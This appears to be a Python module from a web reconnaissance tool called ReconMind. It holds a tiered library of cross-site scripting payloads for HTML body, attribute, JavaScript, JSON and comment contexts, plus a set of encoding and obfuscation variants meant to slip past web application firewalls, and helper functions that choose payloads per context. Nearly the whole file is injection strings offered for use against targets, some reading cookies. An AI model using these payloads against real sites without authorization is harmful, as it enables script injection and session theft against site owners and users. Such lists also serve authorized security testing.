"""
core/payloads/xss_payloads.py
==============================
XSS payload library for ReconMind Phase 2.

Why this file exists:
    Blind payload spraying is what amateur tools do. ReconMind uses the
    context information from Phase 1's context_analyzer to select ONLY
    the payloads that make sense for the detected reflection context.

    Sending an HTML body payload into a JS string context wastes requests
    and triggers WAFs unnecessarily. Context-aware selection means:
        - Fewer requests per parameter
        - Higher hit rate per request
        - Less noise on the target
        - More professional reconnaissance behavior

Payload tiers:
    TIER_1  — Fast confirmation probes (2-3 payloads, always run first).
              Minimal, safe, designed to confirm execution is possible
              without triggering CSP or aggressive WAFs.

    TIER_2  — Context-specific payloads (5-8 payloads per context type).
              Chosen based on Phase 1 context analysis output.

    TIER_3  — WAF bypass / obfuscation variants (opt-in via CONFIG).
              Used when Tier 1/2 fail and the target shows signs of filtering.

Payload structure:
    Each payload is a dict with:
        'payload'   : The string to inject
        'tier'      : 1, 2, or 3
        'context'   : Which context this targets
        'technique' : Short description for reporting
        'confirm'   : Optional string to look for in response that
                      confirms execution (beyond simple reflection)
"""

from typing import List, Dict, Any


# ---------------------------------------------------------------------------
# Type alias for readability
# ---------------------------------------------------------------------------
Payload = Dict[str, Any]


# ---------------------------------------------------------------------------
# TIER 1 — Universal fast probes
# These are the first payloads sent regardless of context.
# They are small, low-noise, and confirm that SOME XSS vector may exist.
# ---------------------------------------------------------------------------

TIER1_PROBES: List[Payload] = [
    {
        "payload": "<script>alert(1)</script>",
        "tier": 1,
        "context": "any",
        "technique": "Basic script tag injection",
    },
    {
        "payload": "<img src=x onerror=alert(1)>",
        "tier": 1,
        "context": "any",
        "technique": "img onerror event",
    },
    {
        "payload": "'\"><svg onload=alert(1)>",
        "tier": 1,
        "context": "any",
        "technique": "Polyglot — breaks string/attr/tag then SVG onload",
    },
]


# ---------------------------------------------------------------------------
# TIER 2 — Context-specific payloads
# ---------------------------------------------------------------------------

# --- HTML Body context ---
# Reflection is inside visible HTML text (e.g. <p>USER_INPUT</p>)
# Goal: inject tags that execute JS
HTML_BODY_PAYLOADS: List[Payload] = [
    {
        "payload": "<script>alert(document.domain)</script>",
        "tier": 2,
        "context": "HTML_BODY",
        "technique": "Script tag with domain exfil",
    },
    {
        "payload": "<svg/onload=alert(1)>",
        "tier": 2,
        "context": "HTML_BODY",
        "technique": "SVG onload (no space variant)",
    },
    {
        "payload": "<img src=x onerror=alert(document.cookie)>",
        "tier": 2,
        "context": "HTML_BODY",
        "technique": "img onerror cookie grab",
    },
    {
        "payload": "<details open ontoggle=alert(1)>",
        "tier": 2,
        "context": "HTML_BODY",
        "technique": "HTML5 details ontoggle",
    },
    {
        "payload": "<body onload=alert(1)>",
        "tier": 2,
        "context": "HTML_BODY",
        "technique": "Body tag onload injection",
    },
    {
        "payload": "<iframe src=javascript:alert(1)>",
        "tier": 2,
        "context": "HTML_BODY",
        "technique": "iframe javascript: URI",
    },
    {
        "payload": "<math><mtext></p><script>alert(1)</script>",
        "tier": 2,
        "context": "HTML_BODY",
        "technique": "MathML namespace confusion",
    },
    {
        "payload": "<textarea><img src=x onerror=alert(1)></textarea>",
        "tier": 2,
        "context": "HTML_BODY",
        "technique": "Textarea tag escape",
    },
]


# --- HTML Attribute context ---
# Reflection is inside an attribute value (e.g. <input value="USER_INPUT">)
# Goal: break out of the attribute or inject an event handler
HTML_ATTR_PAYLOADS: List[Payload] = [
    {
        "payload": "\" onmouseover=\"alert(1)\"",
        "tier": 2,
        "context": "HTML_ATTR",
        "technique": "Double-quote attribute escape + event handler",
    },
    {
        "payload": "' onmouseover='alert(1)'",
        "tier": 2,
        "context": "HTML_ATTR",
        "technique": "Single-quote attribute escape + event handler",
    },
    {
        "payload": "\" autofocus onfocus=\"alert(1)\"",
        "tier": 2,
        "context": "HTML_ATTR",
        "technique": "Autofocus onfocus — fires without user interaction",
    },
    {
        "payload": "\"><script>alert(1)</script>",
        "tier": 2,
        "context": "HTML_ATTR",
        "technique": "Full tag escape and script injection",
    },
    {
        "payload": "\" onerror=\"alert(1)\" x=\"",
        "tier": 2,
        "context": "HTML_ATTR",
        "technique": "onerror injection with closing attribute",
    },
    {
        "payload": "javascript:alert(1)",
        "tier": 2,
        "context": "HTML_ATTR",
        "technique": "javascript: URI (href/src attributes)",
    },
    {
        "payload": "\" onblur=\"alert(1)\" a=\"",
        "tier": 2,
        "context": "HTML_ATTR",
        "technique": "onblur event handler",
    },
]


# --- JavaScript context ---
# Reflection is inside a <script> block (e.g. var x = "USER_INPUT";)
# Goal: break out of the string, inject JS, or hijack execution
JS_CONTEXT_PAYLOADS: List[Payload] = [
    {
        "payload": "';alert(1)//",
        "tier": 2,
        "context": "JS",
        "technique": "Single-quote string breakout",
    },
    {
        "payload": "\";alert(1)//",
        "tier": 2,
        "context": "JS",
        "technique": "Double-quote string breakout",
    },
    {
        "payload": "`};alert(1)//",
        "tier": 2,
        "context": "JS",
        "technique": "Template literal + block breakout",
    },
    {
        "payload": "'-alert(1)-'",
        "tier": 2,
        "context": "JS",
        "technique": "String subtraction trick (no quotes needed)",
    },
    {
        "payload": "${alert(1)}",
        "tier": 2,
        "context": "JS",
        "technique": "Template literal expression injection",
    },
    {
        "payload": "';alert(document.domain)//",
        "tier": 2,
        "context": "JS",
        "technique": "String breakout with domain confirmation",
    },
    {
        "payload": "\\\";alert(1)//",
        "tier": 2,
        "context": "JS",
        "technique": "Backslash escape neutralization",
    },
    {
        "payload": "</script><script>alert(1)</script>",
        "tier": 2,
        "context": "JS",
        "technique": "Script tag close and reopen",
    },
]


# --- JSON context ---
# Reflection is inside a JSON value (e.g. {"key": "USER_INPUT"})
# Goal: break the JSON string and inject JS that gets eval'd or placed in DOM
JSON_CONTEXT_PAYLOADS: List[Payload] = [
    {
        "payload": "\",\"xss\":\"<script>alert(1)</script>",
        "tier": 2,
        "context": "JSON",
        "technique": "JSON key injection with script tag",
    },
    {
        "payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "tier": 2,
        "context": "JSON",
        "technique": "Unicode escape sequence bypass",
    },
    {
        "payload": "\": \"<img src=x onerror=alert(1)>",
        "tier": 2,
        "context": "JSON",
        "technique": "JSON string injection with img onerror",
    },
    {
        "payload": "<!--<script>alert(1)</script>-->",
        "tier": 2,
        "context": "JSON",
        "technique": "HTML comment wrapping for HTML context reuse",
    },
]


# --- HTML Comment context ---
# Reflection is inside <!-- USER_INPUT -->
# Goal: break out of the comment
COMMENT_CONTEXT_PAYLOADS: List[Payload] = [
    {
        "payload": "--><script>alert(1)</script><!--",
        "tier": 2,
        "context": "COMMENT",
        "technique": "HTML comment escape + script injection",
    },
    {
        "payload": "--><img src=x onerror=alert(1)><!--",
        "tier": 2,
        "context": "COMMENT",
        "technique": "HTML comment escape + img onerror",
    },
    {
        "payload": "--><!--<script>alert(1)</script><!--",
        "tier": 2,
        "context": "COMMENT",
        "technique": "Double comment escape",
    },
]


# ---------------------------------------------------------------------------
# TIER 3 — WAF bypass payloads (opt-in)
# Used when standard payloads are filtered. These use encoding tricks,
# unusual tag attributes, and browser parsing quirks.
# ---------------------------------------------------------------------------

WAF_BYPASS_PAYLOADS: List[Payload] = [
    {
        "payload": "<ScRiPt>alert(1)</sCrIpT>",
        "tier": 3,
        "context": "any",
        "technique": "Mixed case tag (basic WAF bypass)",
    },
    {
        "payload": "<script\x0d\x0aalert(1)></script>",
        "tier": 3,
        "context": "any",
        "technique": "CR/LF injection in script tag",
    },
    {
        "payload": "<%2Fscript><script>alert(1)</script>",
        "tier": 3,
        "context": "any",
        "technique": "URL-encoded closing tag",
    },
    {
        "payload": "<svg><script>alert&#40;1&#41;</script>",
        "tier": 3,
        "context": "any",
        "technique": "SVG namespace + HTML entity encoded parens",
    },
    {
        "payload": "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
        "tier": 3,
        "context": "any",
        "technique": "Multi-attribute confusion",
    },
    {
        "payload": "<<script>alert(1)//<</script>",
        "tier": 3,
        "context": "any",
        "technique": "Double angle bracket",
    },
    {
        "payload": "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "tier": 3,
        "context": "any",
        "technique": "Base64 encoded payload via atob()",
    },
    {
        "payload": "<input onfocus=alert(1) autofocus>",
        "tier": 3,
        "context": "any",
        "technique": "Autofocus onfocus (no user interaction)",
    },
    {
        "payload": "\"><img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "tier": 3,
        "context": "HTML_ATTR",
        "technique": "Attr escape + base64 encoded onerror",
    },
    {
        "payload": "';eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",
        "tier": 3,
        "context": "JS",
        "technique": "JS string breakout + charcode eval bypass",
    },
]


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def get_payloads_for_context(
    context: str,
    include_tier1: bool = True,
    include_tier2: bool = True,
    include_tier3: bool = False,
    max_per_context: int = 10,
) -> List[Payload]:
    """
    Return the appropriate payload list for a given reflection context.

    This is the primary function called by the XSS testing module.
    It assembles a prioritized payload list based on:
        1. Whether Tier 1 (fast probes) are included
        2. Context-specific Tier 2 payloads
        3. Optionally, WAF bypass Tier 3 payloads

    Args:
        context:          One of: JS, HTML_BODY, HTML_ATTR, JSON, COMMENT, UNKNOWN
        include_tier1:    Always include universal fast probes.
        include_tier2:    Include context-specific payloads.
        include_tier3:    Include WAF bypass payloads (default False).
        max_per_context:  Cap total payloads returned to limit requests.

    Returns:
        List of Payload dicts, ordered Tier1 → Tier2 → Tier3.
    """
    selected: List[Payload] = []

    if include_tier1:
        selected.extend(TIER1_PROBES)

    if include_tier2:
        context_map = {
            "JS":         JS_CONTEXT_PAYLOADS,
            "HTML_BODY":  HTML_BODY_PAYLOADS,
            "HTML_ATTR":  HTML_ATTR_PAYLOADS,
            "JSON":       JSON_CONTEXT_PAYLOADS,
            "COMMENT":    COMMENT_CONTEXT_PAYLOADS,
            "UNKNOWN":    HTML_BODY_PAYLOADS,  # Default to HTML body for unknowns
        }
        tier2 = context_map.get(context, HTML_BODY_PAYLOADS)
        selected.extend(tier2)

    if include_tier3:
        # For Tier 3: only include payloads targeting this context or "any"
        tier3_filtered = [
            p for p in WAF_BYPASS_PAYLOADS
            if p["context"] in (context, "any")
        ]
        selected.extend(tier3_filtered)

    # Deduplicate while preserving order
    seen = set()
    unique = []
    for p in selected:
        key = p["payload"]
        if key not in seen:
            seen.add(key)
            unique.append(p)

    return unique[:max_per_context]


def get_all_payloads(include_tier3: bool = False) -> List[Payload]:
    """
    Return every payload in the library (for bulk testing).

    Args:
        include_tier3: Whether to include WAF bypass payloads.

    Returns:
        Deduplicated list of all Payload dicts.
    """
    all_p = TIER1_PROBES + HTML_BODY_PAYLOADS + HTML_ATTR_PAYLOADS + \
            JS_CONTEXT_PAYLOADS + JSON_CONTEXT_PAYLOADS + COMMENT_CONTEXT_PAYLOADS

    if include_tier3:
        all_p += WAF_BYPASS_PAYLOADS

    seen = set()
    unique = []
    for p in all_p:
        if p["payload"] not in seen:
            seen.add(p["payload"])
            unique.append(p)

    return unique
